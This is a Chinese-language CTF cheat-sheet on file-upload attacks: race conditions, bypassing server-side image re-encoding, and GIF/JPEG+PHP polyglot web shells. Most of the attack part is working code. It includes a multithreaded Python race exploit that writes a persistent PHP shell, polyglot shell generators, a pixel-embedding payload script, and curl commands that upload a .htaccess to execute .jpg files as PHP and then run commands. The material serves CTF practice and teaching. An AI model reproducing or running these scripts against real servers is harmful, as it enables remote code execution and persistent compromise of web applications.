---
title: 文件上传：条件竞争与二次渲染、图片马绕过内容检测
category: web
tags: [file-upload, race-condition, polyglot, image-magic, bypass]
signals: [上传后文件被立刻删除或改名, 上传目录可访问 GET /uploads/xxx.php, 提示「上传成功但文件已删除」, 图片上传后返回缩略图 URL, 上传 .php 被拒但改了扩展名后上传成功, 提示「竞争」「race」「图片马」, 服务端用 getimagesize 或 Pillow 校验, 有 /tmp 目录上传暂存的场景, 头像上传返回二次渲染后的图片]
difficulty: hard
source: "PortSwigger / HackTricks / CTF-Wiki"
tools: [burpsuite, python, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 上传后提示"文件已删除"、"临时文件将在 5 秒后清理"，但上传目录可以 GET。
- 头像/证件照上传后，页面显示的是**重新编码过的**图片（尺寸变了、EXIF 没了）。
- 上传检测用的是 `getimagesize()`、`PIL.Image.open()`、`file()` magic —— 只认文件头。
- 有 `/tmp/phpXXXXXX` 这类临时文件名出现在报错里。
- 题面提示：`竞争`、`race`、`polyglot`、`图片马`、`二次渲染`、`上传`。
- 上传接口有时返回 500、有时 200（条件竞争特征）。
- 上传目录是 `/upload/`、`/uploads/`、`/static/img/`，且没有 `X-Content-Type-Options`。

## 二、原理

### 1. 条件竞争（Race Condition）

后端的典型写法：

```php
move_uploaded_file($_FILES['f']['tmp_name'], "upload/" . $name);
if (!is_php_file("upload/" . $name)) {
    unlink("upload/" . $name);    // 检查不合格 → 删除
    die("not allowed");
}
```

**"落地"与"检查"之间有窗口期**。在这个窗口多线程狂 GET 这个文件，就能先让 PHP 解析器执行它。利用脚本通常同时跑两个线程：

- 线程 A：疯狂上传
- 线程 B：疯狂 GET `http://target/upload/shell.php`

只要**一次**命中，`shell.php` 里的 `file_put_contents("a.php", "<?php ...")` 就落地了一个永久 shell。

### 2. 二次渲染（Re-encode）

后端用 `imagecreatefromjpeg` + `imagejpeg` 重新生成图片 → 你塞在 EXIF/注释里的 PHP 代码**全部丢失**。绕过思路：

1. 把 payload 写进**做二次渲染时仍会保留下来的像素区**（如渐变色块），用脚本自动生成。
2. 使用 **GIF 的帧注释/扩展块**，某些库不会丢弃。
3. 直接上传 `.htaccess` / `.user.ini` 让服务器把 `.jpg` 当 PHP 解析（需 `AllowOverride` + `AddHandler`）。
4. 利用**文件名**注入（`Content-Disposition` 或 `filename="a.php\x00.jpg"`，老 PHP）。

### 3. 图片马（Polyglot）

同时是合法图片 + 合法 PHP：

```php
<?php
// 文件头保持 GIF89a
$payload = '<?php system($_GET["c"]); ?>';
```

或直接：

```
GIF89a<?php system($_GET['c']); ?>
```

`getimagesize()` 认 `GIF89a`，PHP 解析器从 `<?php` 开始执行。

## 三、解题步骤

1. **确认上传后文件是否可访问**：记下返回的 URL，GET 一下。
2. **判断是"删除"还是"改名"**：报错说"不允许"→ 条件竞争；"成功"但访问 404 → 二次渲染/改名。
3. **条件竞争**：多线程上传 + 多线程访问，命中后立刻写永久 shell。
4. **二次渲染大写**：先把图片下载回来，看 payload 在哪个字节偏移还活着（用 `binwalk`、`strings` 对比）。
5. **图片马**：`GIF89a` + PHP 代码，配 `include` 漏洞使用。
6. **`.htaccess` 突围**：上传 `.htaccess` 内容为 `AddType application/x-httpd-php .jpg`，再传 `shell.jpg`。
7. **验证**：`curl 'http://target/upload/shell.php?c=id'`。

## 四、可直接运行的脚本

条件竞争（上传 + 访问双线程）：

```python
import threading, requests, time, itertools

URL_UP = "http://TARGET/upload.php"
URL_GET = "http://TARGET/upload/shell.php"

# 落地一个持久 shell，避免抢到的只是一次性执行
SHELL = b'<?php file_put_contents("pwns.php", "<?php system($_GET[c]);?>"); ?>'
EVIL  = b'GIF89a' + SHELL

stop = False

def uploader():
    while not stop:
        try:
            requests.post(URL_UP, files={"f": ("shell.php", EVIL, "image/gif")}, timeout=3)
        except Exception:
            pass

def getter():
    while not stop:
        try:
            r = requests.get(URL_GET + "?x=%s" % next(_c), timeout=3)
            if r.status_code == 200 and "pwns" in r.text:
                print("[+] hit")
                return
        except Exception:
            pass

_c = itertools.count()
threads = [threading.Thread(target=uploader, daemon=True) for _ in range(8)]
threads += [threading.Thread(target=getter,   daemon=True) for _ in range(8)]
for t in threads: t.start()
time.sleep(60)
stop = True

# 验证
print(requests.get("http://TARGET/upload/pwns.php?c=id", timeout=10).text)
```

图片马生成（GIF + PHP）：

```bash
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
# 若只允许 jpg：用真实 jpeg 后拼接
python3 -c "
open('shell.php.jpg','wb').write(open('real.jpg','rb').read() + b'<?php system(\$_GET[\"c\"]); ?>')"
```

二次渲染绕过（写进 PNG 的 IDAT 后仍有损的 fix）：

```python
from PIL import Image
import requests

# 本地生成一张带 payload 的 PNG，看服务端重渲染后能否存活
im = Image.open("real.png").convert("RGBA")
px = im.load()
payload = b"<?php system($_GET['c']);?>"
bits = "".join(format(b, "08b") for b in payload)
w, h = im.size
i = 0
for y in range(h):
    for x in range(w):
        if i >= len(bits): break
        r, g, b, a = px[x, y]
        px[x, y] = ((r & 0xFE) | int(bits[i]), g, b, a)
        i += 1
im.save("payload.png")
```

`.htaccess` 上传：

```bash
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -F 'f=@.htaccess' http://TARGET/upload.php
curl -F 'f=@shell.jpg'  http://TARGET/upload.php
curl 'http://TARGET/upload/shell.jpg?c=id'
```

## 五、常见坑 / 变体

- **临时文件路径不可知**：`/tmp/phpXXXXXX` 是随机的，做不了"上传后访问临时文件"；但 `move_uploaded_file` 的目标路径是确定的。
- **多线程不够快**：用 `python-multipart` 的 raw socket 并发，或 `ab -n 2000` 压测，成功率会高很多。
- **文件被 `rename` 成 uuid**：竞争时同时上传多个，把 `uuid` 猜出来难度大，改用**先写永久 shell** 的 payload（如上面的 `file_put_contents`）。
- **`getimagesize` 只读头部 12 字节**：`GIF89a` 后直接跟 PHP 即可。
- **二次渲染会破坏字节**：PNG 无损可保留像素位；JPEG 有损必挂 → 改用 GIF 的多帧或 WebP。
- **变体：文件名含 `%00` 截断**（PHP < 5.3.4）。
- **变体：`Content-Type` 伪造 + 扩展名 `php5`/`phtml`/`pht`/`.phar`**（见 `file-upload-bypass.md`）。
- **变体：Zip 解压**（`zip://`）+ 软链接逃逸（`linux/zip_symlink`）。
- **变体：`phar://` 上传**（触发反序列化），见 `phar-deserialization.md`。
- **变体：`upload_progress` 竞争**——PHP session 上传进度文件里含文件名，可写入 PHP。

## 六、参考来源

- [PortSwigger Lab — RCE via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
- [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks — File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [PHP 手册 — getimagesize](https://www.php.net/manual/zh/function.getimagesize.php)
- [CTF Wiki — 文件上传](https://ctf-wiki.org/web/introduction/)
- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
